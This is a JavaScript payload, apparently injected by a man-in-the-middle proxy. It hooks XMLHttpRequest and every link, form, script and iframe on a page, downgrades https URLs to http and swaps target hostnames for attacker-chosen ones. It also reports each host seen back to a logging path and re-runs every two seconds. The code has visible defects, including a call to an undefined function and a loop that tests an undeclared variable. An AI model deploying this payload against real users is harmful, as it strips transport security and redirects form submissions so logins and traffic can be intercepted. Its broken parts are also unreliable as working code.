/*
  Hooks XMLHttpRequest as well as 'a', 'form', 'script' & 'iframe' nodes.
  This payload is essential for hostname replacements.

  Remember that any occurrence of 'obf_path_ssl_log', 'obf_path_callback' and
  'obf_path_whitelist' in this payload will be replaced when the proxy module
  loads and that variable names 'obf_var_target_hosts' and 'obf_var_replacement_hosts'
  are already declared before this is injected.
*/

var obf_func_open = XMLHttpRequest.prototype.open,
    obf_var_XMLHttpRequest = new XMLHttpRequest(),
    obf_var_callback_log = [];

function obf_func_toWholeRegexp(obf_var_selector_string, obf_var_replacement_string) {
  obf_var_selector_string = obf_var_selector_string.replace(/\./g, "\\.");
  obf_var_selector_string = obf_var_selector_string.replace(/\-/g, "\\-");
  return [
    new RegExp("^" + obf_var_selector_string + "$", "ig"),
    obf_var_replacement_string
  ];
}

function obf_func_toWholeWildcardRegexp(obf_var_selector_string, obf_var_replacement_string) {
  obf_var_selector_string = obf_var_selector_string.replace(/\-/g, "\\-");
  if (obf_var_selector_string.match(/^\*./)) {
    obf_var_selector_string = obf_var_selector_string.replace(/^\*\./, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)");
    obf_var_selector_string = obf_var_selector_string.replace(/\./g, "\\.");
    obf_var_replacement_string = obf_var_replacement_string.replace(/^\*\./, "");
    return [
      new RegExp("^" + obf_var_selector_string + "$", "ig"),
      "$1" + obf_var_replacement_string
    ];
  } else if (obf_var_selector_string.match(/\.\*$/)) {
    obf_var_selector_string = obf_var_selector_string.replace(/\.\*/g, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)");
    obf_var_selector_string = obf_var_selector_string.replace(/\./g, "\\.");
    obf_var_replacement_string = obf_var_replacement_string.replace(/\.\*$/, "");
    return [
      new RegExp(obf_var_selector_string, "ig"),
      obf_var_replacement_string + "$1"
    ];
  }
}

function obf_func_toWholeRegexpSet(obf_var_selector_string, obf_var_replacement_string) {
  if (obf_var_selector_string.indexOf("*") != -1) {
    return obf_func_toWholeWildcardRegexp(
      obf_var_selector_string,
      obf_var_replacement_string);
  } else {
    return obf_func_toWholeRegexp(
      obf_var_selector_string,
      obf_var_replacement_string);
  }
}

function obf_func_callback(obf_var_host) {
  for (
    obf_var_i = 0;
    obf_var_i < obf_var_callback_log.length;
    obf_var_i++
  ) {
    if (obf_var_callback_log[i] == obf_var_host) {
      return;
    }
  }
  obf_var_callback_log.push(obf_var_host);
  obf_var_req = obf_var_XMLHttpRequest;
  obf_var_req.open(
    "GET",
    "http://" + location.host + "/obf_path_ssl_log?" + obf_var_host,
    true);
  obf_var_req.send();
}

function obf_func_hijack(obf_var_host) {
  for (
    obf_var_i = 0;
    obf_var_i < obf_var_target_hosts.length;
    obf_var_i++
  ) {
    obf_var_whole_regexp_set = obf_func_toWholeRegexpSet(
      obf_var_target_hosts[obf_var_i],
      obf_var_replacement_hosts[obf_var_i]);
    if (obf_var_host.match(obf_var_whole_regexp_set[0])) {
      obf_var_host = obf_var_host.replace(
        obf_var_whole_regexp_set[0],
        obf_var_whole_regexp_set[1]);
      break;
    }
  }
  return obf_var_host;
}

function obf_func_hook_XMLHttpRequest() {
  XMLHttpRequest.prototype.open = function(
    obf_var_method,
    obf_var_url,
    obf_var_async,
    obf_var_username,
    obf_var_password
  ) {
    obf_var_host = obf_var_url.replace(/^(?:[a-z]+:\/\/|[/]+)?([^:/?#]*).*/i, "$1");
    obf_var_hijacked_host = obf_func_hstshijack(obf_var_host);
    obf_var_path = obf_var_url.replace(/(?:[a-z]+:\/\/)?.*([:/?#].*)/i, "$1");
    obf_var_url = obf_var_url
      .replace(/^(http)s:\/\//i, "$1://")
      .replace(obf_var_host, obf_var_hijacked_host)
      .replace(/:443([^0-9]|$)/, "$1");
    return obf_func_open.apply(this, arguments);
  }
}

function obf_func_hook_nodes() {
  document.querySelectorAll("a,form,script,iframe").forEach(function(obf_var_node){
    try {
      obf_var_url = "";
      switch (obf_var_node.tagName) {
        case "A":
          obf_var_node.href
            ? obf_var_url = obf_var_node.href
            : "";
          break;
        case "FORM":
          obf_var_node.action
            ? obf_var_url = obf_var_node.action
            : "";
          break;
        case "SCRIPT":
          obf_var_node.src
            ? obf_var_url = obf_var_node.src
            : "";
          break;
        case "IFRAME":
          obf_var_node.src
            ? obf_var_url = obf_var_node.src
            : "";
          break;
      }
      if (obf_var_url.match(/^(?:http[s]?:)?\/\/[^:/?#]+/i)) {
        obf_var_host = obf_var_url.replace(/^(?:http[s]?:)?\/\/([^:/?#]+).*/i, "$1");
        obf_var_path = obf_var_url.replace(/^(?:http[s]?:)?\/\/[^:/?#]+(.*)/i, "$1");
        obf_var_hijacked_host = obf_func_hijack(obf_var_host);
        obf_var_hijacked_url = "http://" + obf_var_hijacked_host + obf_var_path;
        switch (obf_var_node.tagName) {
          case "A":
            if (obf_var_node.href) {
              obf_var_node.href = obf_var_hijacked_url;
            }
            break;
          case "FORM":
            if (obf_var_node.action) {
              obf_var_node.action = obf_var_hijacked_url;
            }
            break;
          case "SCRIPT":
            if (obf_var_node.src) {
              obf_var_node.src = obf_var_hijacked_url;
            }
            break;
          case "IFRAME":
            if (obf_var_node.src) {
              obf_var_node.src = obf_var_hijacked_url;
            }
            break;
        }
        obf_func_callback(obf_var_host.toLowerCase());
      }
    } catch(obf_var_ignore) {}
  });
}

try {
  obf_func_hook_XMLHttpRequest();
} catch(obf_var_ignore) {}

try {
  setInterval(obf_func_hook_nodes, 2000);
  obf_func_hook_nodes();
} catch(obf_var_ignore) {}

try {
  globalThis.addEventListener("load", obf_func_hook_nodes);
} catch(obf_var_ignore) {}

try {
  document.addEventListener("DOMContentLoaded", obf_func_hook_nodes);
} catch(obf_var_ignore) {}

